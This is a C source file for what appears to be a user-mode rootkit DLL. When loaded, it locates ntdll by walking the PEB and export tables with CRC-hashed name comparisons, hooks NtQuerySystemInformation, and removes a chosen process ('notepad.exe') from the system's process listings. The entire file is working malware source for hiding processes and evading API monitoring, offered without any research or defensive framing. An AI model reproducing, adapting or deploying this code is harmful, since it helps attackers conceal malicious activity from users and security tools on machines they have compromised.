#include "rku.h"

unsigned char hide_me[] = "notepad.exe";
unsigned short whide_me[] = L"notepad.exe";


unsigned int crc32s(const wchar_t* message) {
    // DYNAMIC_RETURN;
    int i, j;
    unsigned int byte, crc, mask;
    int CRC_CONST = 1 ? message == NULL : 0;
    CRC_CONST *= 78;
    CRC_CONST += 1;
    CRC_CONST *= 787;
    CRC_CONST += 100000;
    CRC_CONST *= 24608;
    i = 0;
    crc = 0xFFFFFFFF;
    while (message[i] != L'\0') {
        byte = message[i];
        if (byte >= 'A'<<2 && byte<= 'Z'<<2){
            byte += ('a' - 'A')<<2;
        }
        crc = crc ^ byte;
        for (j = 7; j >= 0; j--) {    // Do eight times.
            mask = -(crc & 1);
            crc = (crc >> 1) ^ (CRC_CONST & mask);
        }
        i = i + 1;
    }
    return ~crc;
}

void to_lower(char *str) {
    if (str == NULL) {
        return; // Handle NULL pointer gracefully.
    }

    while (*str != '\0') {
        if (*str >= 'A' && *str <= 'Z') {
            *str += ('a' - 'A');
        }
        str++;
    }
}

unsigned int crc32c(const unsigned char* message) {
    int i, j;
    unsigned int byte, crc, mask;
    int CRC_CONST = 1 ? message == NULL : 0;
    CRC_CONST *= 78;
    CRC_CONST += 1;
    CRC_CONST *= 787;
    CRC_CONST += 100000;
    CRC_CONST *= 24608;
    i = 0;
    crc = 0xFFFFFFFF;
    while (message[i] != '\0') {
        byte = message[i];
        if (byte >= 'A' && byte<= 'Z'){
            byte += ('a' - 'A');
        }
        crc = crc ^ byte;
        for (j = 7; j >= 0; j--) {    // Do eight times.
            mask = -(crc & 1);
            crc = (crc >> 1) ^ (CRC_CONST & mask);
        }
        i = i + 1;
    }
    return ~crc;
}

size_t custom_wcslen(const wchar_t* str) {
    if (str == NULL) {
        return 0;
    }
    size_t length = 0;
    while (*str != L'\0') {
        length++;
        str++;
    }
    return length;
}
int custom_wcscmp(const wchar_t* str1, const wchar_t* str2) {
    return crc32s(str1) != crc32s(str2);
}

int custom_strcmp(const char* str1, const char* str2) {
    return crc32c(str1) != crc32c(str2);
}
FARPROC _GetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfFunctions);
    WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule + exportDirectory->AddressOfNameOrdinals);
    DWORD* addressOfNames = (DWORD*)((BYTE*)hModule + exportDirectory->AddressOfNames);
    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        if (custom_strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
            return (FARPROC)((BYTE*)hModule + addressOfFunctions[addressOfNameOrdinals[i]]);
        }
    }
    return NULL;
}

HMODULE _GetModuleHandle(LPCWSTR lModuleName) {
    PEB* pPeb = (PEB*)__readgsqword(0x60);
    PEB_LDR_DATA* Ldr = pPeb->Ldr;
    LIST_ENTRY* ModuleList = &Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* pStartListEntry = ModuleList->Flink;
    WCHAR mystr[MAX_PATH] = { 0 };
    WCHAR substr[MAX_PATH] = { 0 };
    for (LIST_ENTRY* pListEntry = pStartListEntry; pListEntry != ModuleList; pListEntry = pListEntry->Flink) {
        LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));
        if (custom_wcscmp(pEntry->FullDllName.Buffer, lModuleName) == 0) {
            return (HMODULE)pEntry->DllBase;
        }
    }
}
FARPROC _GetProcAddressNative(LPCSTR lpProcName){
    unsigned short sntdll_full_path[] = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
    HMODULE hNtdll = _GetModuleHandle(sntdll_full_path);
    return _GetProcAddress(hNtdll, lpProcName);

}


typedef NTSTATUS (NTAPI* fpNtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);


int hookNt(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
){
    fpNtQuerySystemInformation f;
    GVA(&f);
    if (SystemInformation != NULL && SystemInformationClass == SystemProcessInformation){
        NTSTATUS res = 0;
        res = f(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
        if (res != 0x0){
            return res;
        }
        PSYSTEM_PROCESS_INFORMATION SystemProcInfo =  (PSYSTEM_PROCESS_INFORMATION) SystemInformation;
        PSYSTEM_PROCESS_INFORMATION prev = SystemProcInfo;
        while (TRUE) {
            if (SystemProcInfo->ImageName.Length && wcscmp(SystemProcInfo->ImageName.Buffer, whide_me) == 0) {
                if (SystemProcInfo->NextEntryOffset){
                prev->NextEntryOffset =prev->NextEntryOffset+SystemProcInfo->NextEntryOffset;
                }
                else{
                    prev->NextEntryOffset = 0;
                }
            }
            else{
                prev = SystemProcInfo;
            }
            if (!SystemProcInfo->NextEntryOffset)
                break;
            SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
        }
        return res;
    }
    else{
        return f(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    }
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpvReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    switch( fdwReason )
    {
        case DLL_PROCESS_ATTACH:
            HookInfo hNtQ;
            fpNtQuerySystemInformation pnt;
            pnt = (fpNtQuerySystemInformation)_GetProcAddressNative("NtQuerySystemInformation");
            InstallHook(pnt, hookNt, &hNtQ);
            break;

        case DLL_THREAD_ATTACH:
         // Do thread-specific initialization.
            break;

        case DLL_THREAD_DETACH:
         // Do thread-specific cleanup.
            break;

        case DLL_PROCESS_DETACH:

            if (lpvReserved != NULL)
            {
                break; // do not do cleanup if process termination scenario
            }
            // RemoveHook(pnt, &hNtQ);
            break;
    }
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}